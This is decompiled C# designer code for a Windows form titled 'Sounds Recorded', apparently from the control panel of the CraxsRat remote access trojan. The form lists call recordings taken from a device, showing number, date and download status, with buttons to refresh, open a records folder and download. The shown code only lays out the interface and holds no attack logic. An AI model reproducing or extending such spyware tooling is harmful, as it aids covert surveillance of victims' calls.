// Token: 0x0200003E RID: 62
[global::Microsoft.VisualBasic.CompilerServices.DesignerGenerated]
public partial class Calls_Records : global::System.Windows.Forms.Form
{
	// Token: 0x060002BF RID: 703 RVA: 0x00049C24 File Offset: 0x00047E24
	[global::System.Diagnostics.DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	// Token: 0x060002C0 RID: 704 RVA: 0x00049C68 File Offset: 0x00047E68
	[global::System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		global::System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle = new global::System.Windows.Forms.DataGridViewCellStyle();
		global::System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle2 = new global::System.Windows.Forms.DataGridViewCellStyle();
		global::System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle3 = new global::System.Windows.Forms.DataGridViewCellStyle();
		global::System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle4 = new global::System.Windows.Forms.DataGridViewCellStyle();
		global::System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle5 = new global::System.Windows.Forms.DataGridViewCellStyle();
		this.DataGridView1 = new global::System.Windows.Forms.DataGridView();
		this.thestat = new global::System.Windows.Forms.DataGridViewTextBoxColumn();
		this.ico = new global::System.Windows.Forms.DataGridViewImageColumn();
		this.num = new global::System.Windows.Forms.DataGridViewTextBoxColumn();
		this.appnam = new global::System.Windows.Forms.DataGridViewTextBoxColumn();
		this.stus = new global::System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Panel1 = new global::System.Windows.Forms.Panel();
		this.loadingbar = new global::DrakeUI.Framework.DrakeUILoadingBar();
		this.DrakeUIButtonIcon2 = new global::DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeUIButtonIcon4 = new global::DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeUIButtonIcon1 = new global::DrakeUI.Framework.DrakeUIButtonIcon();
		((global::System.ComponentModel.ISupportInitialize)this.DataGridView1).BeginInit();
		this.Panel1.SuspendLayout();
		base.SuspendLayout();
		this.DataGridView1.AllowUserToAddRows = false;
		this.DataGridView1.AllowUserToDeleteRows = false;
		this.DataGridView1.AllowUserToResizeColumns = false;
		this.DataGridView1.AllowUserToResizeRows = false;
		dataGridViewCellStyle.Alignment = global::System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 8.25f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
		this.DataGridView1.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle;
		this.DataGridView1.AutoSizeColumnsMode = global::System.Windows.Forms.DataGridViewAutoSizeColumnsMode.Fill;
		this.DataGridView1.BackgroundColor = global::System.Drawing.Color.Black;
		dataGridViewCellStyle2.Alignment = global::System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle2.BackColor = global::System.Drawing.SystemColors.Control;
		dataGridViewCellStyle2.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 8.25f);
		dataGridViewCellStyle2.ForeColor = global::System.Drawing.SystemColors.WindowText;
		dataGridViewCellStyle2.SelectionBackColor = global::System.Drawing.SystemColors.Highlight;
		dataGridViewCellStyle2.SelectionForeColor = global::System.Drawing.SystemColors.HighlightText;
		dataGridViewCellStyle2.WrapMode = global::System.Windows.Forms.DataGridViewTriState.True;
		this.DataGridView1.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle2;
		this.DataGridView1.ColumnHeadersHeightSizeMode = global::System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
		this.DataGridView1.Columns.AddRange(new global::System.Windows.Forms.DataGridViewColumn[]
		{
			this.thestat,
			this.ico,
			this.num,
			this.appnam,
			this.stus
		});
		dataGridViewCellStyle3.Alignment = global::System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle3.BackColor = global::System.Drawing.SystemColors.Window;
		dataGridViewCellStyle3.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 8.25f);
		dataGridViewCellStyle3.ForeColor = global::System.Drawing.SystemColors.ControlText;
		dataGridViewCellStyle3.SelectionBackColor = global::System.Drawing.SystemColors.Highlight;
		dataGridViewCellStyle3.SelectionForeColor = global::System.Drawing.SystemColors.HighlightText;
		dataGridViewCellStyle3.WrapMode = global::System.Windows.Forms.DataGridViewTriState.False;
		this.DataGridView1.DefaultCellStyle = dataGridViewCellStyle3;
		this.DataGridView1.Dock = global::System.Windows.Forms.DockStyle.Fill;
		this.DataGridView1.Location = new global::System.Drawing.Point(0, 51);
		this.DataGridView1.Name = "DataGridView1";
		this.DataGridView1.ReadOnly = true;
		dataGridViewCellStyle4.Alignment = global::System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle4.BackColor = global::System.Drawing.SystemColors.Control;
		dataGridViewCellStyle4.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 8.25f);
		dataGridViewCellStyle4.ForeColor = global::System.Drawing.SystemColors.WindowText;
		dataGridViewCellStyle4.SelectionBackColor = global::System.Drawing.SystemColors.Highlight;
		dataGridViewCellStyle4.SelectionForeColor = global::System.Drawing.SystemColors.HighlightText;
		dataGridViewCellStyle4.WrapMode = global::System.Windows.Forms.DataGridViewTriState.True;
		this.DataGridView1.RowHeadersDefaultCellStyle = dataGridViewCellStyle4;
		this.DataGridView1.RowHeadersVisible = false;
		dataGridViewCellStyle5.Alignment = global::System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle5.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 8.25f);
		this.DataGridView1.RowsDefaultCellStyle = dataGridViewCellStyle5;
		this.DataGridView1.SelectionMode = global::System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
		this.DataGridView1.ShowCellErrors = false;
		this.DataGridView1.ShowCellToolTips = false;
		this.DataGridView1.ShowEditingIcon = false;
		this.DataGridView1.ShowRowErrors = false;
		this.DataGridView1.Size = new global::System.Drawing.Size(593, 390);
		this.DataGridView1.TabIndex = 2;
		this.thestat.AutoSizeMode = global::System.Windows.Forms.DataGridViewAutoSizeColumnMode.None;
		this.thestat.HeaderText = "Status";
		this.thestat.Name = "thestat";
		this.thestat.ReadOnly = true;
		this.thestat.Width = 50;
		this.ico.FillWeight = 25f;
		this.ico.HeaderText = "     ";
		this.ico.ImageLayout = global::System.Windows.Forms.DataGridViewImageCellLayout.Zoom;
		this.ico.Name = "ico";
		this.ico.ReadOnly = true;
		this.num.FillWeight = 86.49746f;
		this.num.HeaderText = "Number";
		this.num.Name = "num";
		this.num.ReadOnly = true;
		this.appnam.FillWeight = 86.49746f;
		this.appnam.HeaderText = "Date";
		this.appnam.Name = "appnam";
		this.appnam.ReadOnly = true;
		this.stus.FillWeight = 86.49746f;
		this.stus.HeaderText = "Downloaded";
		this.stus.Name = "stus";
		this.stus.ReadOnly = true;
		this.Panel1.Controls.Add(this.loadingbar);
		this.Panel1.Controls.Add(this.DrakeUIButtonIcon2);
		this.Panel1.Controls.Add(this.DrakeUIButtonIcon4);
		this.Panel1.Controls.Add(this.DrakeUIButtonIcon1);
		this.Panel1.Dock = global::System.Windows.Forms.DockStyle.Top;
		this.Panel1.Location = new global::System.Drawing.Point(0, 0);
		this.Panel1.Name = "Panel1";
		this.Panel1.Size = new global::System.Drawing.Size(593, 51);
		this.Panel1.TabIndex = 5;
		this.loadingbar.Enabled = false;
		this.loadingbar.Font = new global::System.Drawing.Font("Calibri", 12f);
		this.loadingbar.ForeColor = global::System.Drawing.Color.Lime;
		this.loadingbar.Location = new global::System.Drawing.Point(526, 6);
		this.loadingbar.Name = "loadingbar";
		this.loadingbar.Size = new global::System.Drawing.Size(55, 32);
		this.loadingbar.Style = global::DrakeUI.Framework.UIStyle.Custom;
		this.loadingbar.TabIndex = 21;
		this.loadingbar.Text = "DrakeUILoadingBar1";
		this.loadingbar.Visible = false;
		this.DrakeUIButtonIcon2.Cursor = global::System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon2.FillColor = global::System.Drawing.Color.Black;
		this.DrakeUIButtonIcon2.FillHoverColor = global::System.Drawing.Color.FromArgb(20, 20, 20);
		this.DrakeUIButtonIcon2.FillPressColor = global::System.Drawing.Color.Black;
		this.DrakeUIButtonIcon2.FillSelectedColor = global::System.Drawing.Color.FromArgb(255, 5, 17);
		this.DrakeUIButtonIcon2.Font = new global::System.Drawing.Font("Bahnschrift SemiBold", 12f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 0);
		this.DrakeUIButtonIcon2.ForeColor = global::System.Drawing.Color.FromArgb(255, 5, 17);
		this.DrakeUIButtonIcon2.ForePressColor = global::System.Drawing.Color.FromArgb(255, 5, 17);
		this.DrakeUIButtonIcon2.Location = new global::System.Drawing.Point(391, 12);
		this.DrakeUIButtonIcon2.Name = "DrakeUIButtonIcon2";
		this.DrakeUIButtonIcon2.Radius = 6;
		this.DrakeUIButtonIcon2.RectColor = global::System.Drawing.Color.FromArgb(255, 5, 17);
		this.DrakeUIButtonIcon2.RectDisableColor = global::System.Drawing.Color.FromArgb(227, 242, 253);
		this.DrakeUIButtonIcon2.RectHoverColor = global::System.Drawing.Color.White;
		this.DrakeUIButtonIcon2.RectPressColor = global::System.Drawing.Color.White;
		this.DrakeUIButtonIcon2.RectSelectedColor = global::System.Drawing.Color.White;
		this.DrakeUIButtonIcon2.Size = new global::System.Drawing.Size(118, 26);
		this.DrakeUIButtonIcon2.Style = global::DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon2.Symbol = 61473;
		this.DrakeUIButtonIcon2.TabIndex = 20;
		this.DrakeUIButtonIcon2.Text = "Refresh";
		this.DrakeUIButtonIcon2.Click += new global::System.EventHandler(this.CraxsRatkfvuiorkenfudpajrsnCraxsRatsrhtsqw);
		this.DrakeUIButtonIcon4.Cursor = global::System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon4.FillColor = global::System.Drawing.Color.Black;
		this.DrakeUIButtonIcon4.FillHoverColor = global::System.Drawing.Color.FromArgb(20, 20, 20);
		this.DrakeUIButtonIcon4.FillPressColor = global::System.Drawing.Color.Black;
		this.DrakeUIButtonIcon4.FillSelectedColor = global::System.Drawing.Color.FromArgb(255, 5, 17);
		this.DrakeUIButtonIcon4.Font = new global::System.Drawing.Font("Bahnschrift SemiBold", 12f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 0);
		this.DrakeUIButtonIcon4.ForeColor = global::System.Drawing.Color.FromArgb(255, 5, 17);
		this.DrakeUIButtonIcon4.ForePressColor = global::System.Drawing.Color.FromArgb(255, 5, 17);
		this.DrakeUIButtonIcon4.Location = new global::System.Drawing.Point(176, 12);
		this.DrakeUIButtonIcon4.Name = "DrakeUIButtonIcon4";
		this.DrakeUIButtonIcon4.Radius = 6;
		this.DrakeUIButtonIcon4.RectColor = global::System.Drawing.Color.FromArgb(255, 5, 17);
		this.DrakeUIButtonIcon4.RectDisableColor = global::System.Drawing.Color.FromArgb(227, 242, 253);
		this.DrakeUIButtonIcon4.RectHoverColor = global::System.Drawing.Color.White;
		this.DrakeUIButtonIcon4.RectPressColor = global::System.Drawing.Color.White;
		this.DrakeUIButtonIcon4.RectSelectedColor = global::System.Drawing.Color.White;
		this.DrakeUIButtonIcon4.Size = new global::System.Drawing.Size(163, 26);
		this.DrakeUIButtonIcon4.Style = global::DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon4.Symbol = 61564;
		this.DrakeUIButtonIcon4.TabIndex = 19;
		this.DrakeUIButtonIcon4.Text = "Records Folder";
		this.DrakeUIButtonIcon4.Click += new global::System.EventHandler(this.CraxsRatkfvuiorkenfudpajrsnCraxsRatswfebcz);
		this.DrakeUIButtonIcon1.Cursor = global::System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon1.FillColor = global::System.Drawing.Color.Black;
		this.DrakeUIButtonIcon1.FillHoverColor = global::System.Drawing.Color.FromArgb(20, 20, 20);
		this.DrakeUIButtonIcon1.FillPressColor = global::System.Drawing.Color.Black;
		this.DrakeUIButtonIcon1.FillSelectedColor = global::System.Drawing.Color.FromArgb(255, 5, 17);
		this.DrakeUIButtonIcon1.Font = new global::System.Drawing.Font("Bahnschrift SemiBold", 12f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 0);
		this.DrakeUIButtonIcon1.ForeColor = global::System.Drawing.Color.FromArgb(255, 5, 17);
		this.DrakeUIButtonIcon1.ForePressColor = global::System.Drawing.Color.FromArgb(255, 5, 17);
		this.DrakeUIButtonIcon1.Location = new global::System.Drawing.Point(12, 12);
		this.DrakeUIButtonIcon1.Name = "DrakeUIButtonIcon1";
		this.DrakeUIButtonIcon1.Radius = 6;
		this.DrakeUIButtonIcon1.RectColor = global::System.Drawing.Color.FromArgb(255, 5, 17);
		this.DrakeUIButtonIcon1.RectDisableColor = global::System.Drawing.Color.FromArgb(227, 242, 253);
		this.DrakeUIButtonIcon1.RectHoverColor = global::System.Drawing.Color.White;
		this.DrakeUIButtonIcon1.RectPressColor = global::System.Drawing.Color.White;
		this.DrakeUIButtonIcon1.RectSelectedColor = global::System.Drawing.Color.White;
		this.DrakeUIButtonIcon1.Size = new global::System.Drawing.Size(129, 26);
		this.DrakeUIButtonIcon1.Style = global::DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon1.Symbol = 57490;
		this.DrakeUIButtonIcon1.TabIndex = 18;
		this.DrakeUIButtonIcon1.Text = "Download";
		this.DrakeUIButtonIcon1.Click += new global::System.EventHandler(this.CraxsRatkfvuiorkenfudpajrsnCraxsRatsaercx);
		base.AutoScaleDimensions = new global::System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = global::System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = global::System.Drawing.Color.Black;
		base.ClientSize = new global::System.Drawing.Size(593, 441);
		base.Controls.Add(this.DataGridView1);
		base.Controls.Add(this.Panel1);
		base.FormBorderStyle = global::System.Windows.Forms.FormBorderStyle.SizableToolWindow;
		base.Name = "Calls_Records";
		base.ShowIcon = false;
		this.Text = "Sounds Recorded";
		((global::System.ComponentModel.ISupportInitialize)this.DataGridView1).EndInit();
		this.Panel1.ResumeLayout(false);
		base.ResumeLayout(false);
	}

	// Token: 0x04000342 RID: 834
	private global::System.ComponentModel.IContainer components;

	// Token: 0x0400034A RID: 842
	[global::System.Runtime.CompilerServices.AccessedThroughProperty("DataGridView1")]
	internal global::System.Windows.Forms.DataGridView DataGridView1;

	// Token: 0x0400034B RID: 843
	[global::System.Runtime.CompilerServices.AccessedThroughProperty("thestat")]
	internal global::System.Windows.Forms.DataGridViewTextBoxColumn thestat;

	// Token: 0x0400034C RID: 844
	[global::System.Runtime.CompilerServices.AccessedThroughProperty("ico")]
	internal global::System.Windows.Forms.DataGridViewImageColumn ico;

	// Token: 0x0400034D RID: 845
	[global::System.Runtime.CompilerServices.AccessedThroughProperty("num")]
	internal global::System.Windows.Forms.DataGridViewTextBoxColumn num;

	// Token: 0x0400034E RID: 846
	[global::System.Runtime.CompilerServices.AccessedThroughProperty("appnam")]
	internal global::System.Windows.Forms.DataGridViewTextBoxColumn appnam;

	// Token: 0x0400034F RID: 847
	[global::System.Runtime.CompilerServices.AccessedThroughProperty("stus")]
	internal global::System.Windows.Forms.DataGridViewTextBoxColumn stus;

	// Token: 0x04000350 RID: 848
	[global::System.Runtime.CompilerServices.AccessedThroughProperty("Panel1")]
	internal global::System.Windows.Forms.Panel Panel1;

	// Token: 0x04000351 RID: 849
	internal global::DrakeUI.Framework.DrakeUIButtonIcon DrakeUIButtonIcon4;

	// Token: 0x04000352 RID: 850
	internal global::DrakeUI.Framework.DrakeUIButtonIcon DrakeUIButtonIcon1;

	// Token: 0x04000353 RID: 851
	[global::System.Runtime.CompilerServices.AccessedThroughProperty("loadingbar")]
	internal global::DrakeUI.Framework.DrakeUILoadingBar loadingbar;

	// Token: 0x04000354 RID: 852
	internal global::DrakeUI.Framework.DrakeUIButtonIcon DrakeUIButtonIcon2;
}
